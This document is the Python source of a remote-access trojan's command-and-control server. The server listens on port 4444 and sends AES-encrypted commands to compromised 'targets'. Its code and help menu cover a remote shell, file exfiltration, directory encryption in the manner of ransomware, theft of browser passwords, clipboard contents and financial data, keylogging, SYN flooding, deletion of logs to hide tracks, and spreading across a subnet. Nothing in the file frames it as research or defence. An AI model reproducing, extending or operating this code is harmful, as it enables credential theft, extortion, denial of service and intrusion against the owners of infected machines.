import socket
import json
import base64
import threading
from termcolor import colored
import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad


def encrypt(data, key, iv):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted_data = cipher.encrypt(pad(data.encode('utf-8'), AES.block_size))
    return base64.b64encode(encrypted_data).decode('utf-8')

def decrypt(encrypted_data, key, iv):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted_data = unpad(cipher.decrypt(base64.b64decode(encrypted_data)), AES.block_size)
    return decrypted_data.decode('utf-8')


AES_KEY = b'ThisIsA32ByteIVForAES256Encrypt!'
AES_IV = b'ThisIsA16ByteIV!'


ips = []
targets = []
clients = 0
stop_server = False

def sendtoall(data):
    json_data = json.dumps(data)
    for target in targets:
        try:
            encrypted_data = encrypt(json_data, AES_KEY, AES_IV)
            target.send(encrypted_data.encode('utf-8'))
        except Exception as e:
            print(f"[-] Failed to send data to {target.getpeername()}: {e}")
            targets.remove(target)
            ips.remove(target.getpeername())

def send(target, data):
    json_data = json.dumps(data)
    encrypted_data = encrypt(json_data, AES_KEY, AES_IV)
    target.send(encrypted_data.encode('utf-8'))

def receive(target):
    encrypted_data = ''
    while True:
        try:
            encrypted_data += target.recv(1024).decode('utf-8')
            return json.loads(decrypt(encrypted_data, AES_KEY, AES_IV))
        except ValueError:
            continue
        except Exception as e:
            print(f'[-] Error receiving data: {e}')
            return None

def print_table(data):
    headers = ["File"]
    table = "\n".join([f"{headers[0]}"] + ["-" * len(headers[0])] + data)
    print(table)

RED = "\033[91m"
GREEN = "\033[92m"
RESET = "\033[0m"

def run(target, ip):
    while True:
        try:
            command = input(f'Shell#~{ip}: ')
            send(target, command)
            if command == 'exit':
                print("[+] Returning to center....")
                break
            elif command.startswith('cd') and len(command) > 1:
                confirmation = receive(target)
                print(confirmation)
            elif command.startswith('download'):
                file_data = receive(target)
                if 'file_data' in file_data:
                    with open(command[9:], 'wb') as f:
                        f.write(base64.b64decode(file_data['file_data']))
                elif 'error' in file_data:
                    print(file_data['error'])
            elif command.startswith('upload'):
                file_path = command[7:]
                if os.path.exists(file_path):
                    with open(file_path, 'rb') as f:
                        file_data = f.read()
                        send(target, {"action": "upload", "file_data": base64.b64encode(file_data).decode('utf-8'), "file_name": os.path.basename(file_path)})
                    response = receive(target)
                    print(response)
                else:
                    print("File does not exist.")
            elif command.startswith('encrypt_dir'):
                while True:
                    progress = receive(target)
                    if 'progress' in progress:
                        print(progress['progress'])
                    elif 'message' in progress:
                        print(progress['message'])
                        break
            elif command.startswith('decrypt_dir'):
                while True:
                    progress = receive(target)
                    if 'progress' in progress:
                        print(progress['progress'])
                    elif 'message' in progress:
                        print(progress['message'])
                        break
            elif command == 'steal_creds' or command == 'steal_info':
                result = receive(target)
                print(result['message'])
                if 'credentials' in result:
                    for cred in result['credentials']:
                        print(f"Profile: {cred['profile']}, URL: {cred['url']}, Username: {cred['username']}, Password: {cred['password']}")
                elif 'info' in result:
                    for key, value in result['info'].items():
                        print(f"{key}: {value}")
            elif command == 'steal_clipboard':
                result = receive(target)
                print(result['message'])
                if 'clipboard' in result:
                    print(f"Clipboard Content: {result['clipboard']}")
            elif command == 'network_info':
                result = receive(target)
                print(result['message'])
                if 'network_info' in result:
                    for interface, details in result['network_info'].items():
                        print(f"Interface: {interface}, Details: {details}")
            elif command.startswith('spread'):
                send(target, command)
                print("[+] Spread command sent")
            else:
                result = receive(target)
                if result is not None:
                    print(result)
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f'[-] Error during command execution: {e}')
            break

def update_targets():
    global targets, ips
    disconnected_targets = []
    for i, target in enumerate(targets):
        try:
            target.send(b'')  
        except Exception as e:
            print(f"Session {i} ({ips[i]}) disconnected: {e}")
            disconnected_targets.append((target, ips[i]))
    
    for target, ip in disconnected_targets:
        targets.remove(target)
        ips.remove(ip)
    
    if disconnected_targets:
        print(colored('[+] Targets updated', 'green'))

def server():
    global clients
    while True:
        if stop_server:
            break
        sock.settimeout(1)
        try:
            target, ip = sock.accept()
            targets.append(target)
            ips.append(ip)
            print(f'{str(target)}-----{str(ip)} has connected')
            clients += 1
        except socket.timeout:
            pass
        except Exception as e:
            print(f'[-] Error accepting connection: {e}')
        
        update_targets()

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('0.0.0.0', 4444))
sock.listen()

print(colored('[+] Waiting for targets to connect....', 'green'))

t1 = threading.Thread(target=server)
t1.start()

while True:
    command = input('* Center: ')
    if command == 'targets':
        for count, ip in enumerate(ips):
            print(f'Session {count}. <-----> {ip}')
    elif command == 'clear':
        if os.name == 'nt':
            os.system('cls')
        else:
            os.system('clear')
    elif command == 'help':
        print("""
            Commands                                        Description
        ----------------------------------------------------------------------------------------------------------------
        Center:
              
        session (e.g 0,1,2)                             connect to the session
        targets                                         get a list of targets
        quit                                            quit from the server and close all connections
        clear                                           clear the screen
        sendall                                         send command to all bots
              
        Shell#:
        
        exit                                            return from the Shell to the Center
        check_priv                                      check your privileges
        download                                        download tool,file,folder... from the target
        upload                                          upload tool,file,folder... to the target
        start_keylogger                                 start keylogger
        stop_keylogger                                  stop keylogger
        encrypt_dir                                     encrypt directory 
        decrypt_dir                                     decrypt directory
        syn_flood 10.10.10.10. 80                       start syn flooding on 10.10.10.10 80 or 443
        stop_syn_flood                                  stop syn flooding
        steal_creds                                     steal browser passwords from Google accounts
        steal_clipboard                                 steal data from target clipboard
        steal_info                                      steal computer information
        steal_financial_data                            steal financial data from browser
        network_info                                    get network information
        scan_network (e.g. 192.168.1.0/24)              scan network 192.168.1.0/24
        anti_forensics                                  delete logs on target machine
        port_scan <target-ip> <start-port> <end-port>   scan target for open ports (e.g scan_port 192.168.1.102 1 1000)
        spread   192.168.1.0/24                         spread in 192.168.1.0/24 network 
              """)
    elif command.startswith('session'):
        try:
            num = int(command.split()[1])
            run(targets[num], ips[num])
        except (IndexError, ValueError):
            print('[-] No session under this number!')
    elif command == 'quit':
        stop_server = True
        for target in targets:
            target.close()
        sock.close()
        t1.join()
        break
    elif command.startswith('sendall'):
        try:
            sendtoall(command.split(' ', 1)[1])
        except IndexError:
            print('[-] Could not send command!')
    else:
        print('[-] Command does not exist')
